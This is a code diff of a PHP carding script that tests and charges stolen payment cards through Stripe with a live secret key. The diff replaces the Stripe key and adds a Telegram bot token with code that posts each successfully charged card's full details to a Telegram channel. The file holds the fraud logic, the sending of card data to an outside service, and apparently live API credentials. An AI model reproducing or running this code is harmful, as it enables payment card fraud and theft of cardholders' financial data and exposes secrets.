@@ -33,7 +33,7 @@ if(empty($amt)) {
 	$amt = '1';
 	$chr = $amt * 100;
 }
-$sk = 'sk_live_3AsmsZEXRTqT7eY3njH68FDa';
+$sk = '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';
 
 $lista = $_GET['lista'];
     $cc = multiexplode(array(":", "|", ""), $lista)[0];
@@ -140,7 +140,17 @@ break;
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
+	$apiToken = "6561204708:AAEzvMB5c3p3WmP1ptLbEF8w78xHRAwoEjY"; 
+ 
+	$data = [ 
+	'chat_id' => '@meong_sender', 
+	'text' => 'CCN CHARGED : '.$lista.''
+	]; 
+ 
+	$response = file_get_contents("http://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); 
+
     echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CCN Charged ✅ Checked by @madameong <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+	
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
@@ -349,7 +359,7 @@ else {
 //echo "<b>Risk Level:</b> $riskl<br>";
 //echo "<b>Seller Message:</b> $seller_msg<br>";
 
-echo " BYPASSING: $x <br>";
+//echo " BYPASSING: $x <br>";
 
 //echo "<br><b>Result3: </b> $result2<br>";
 
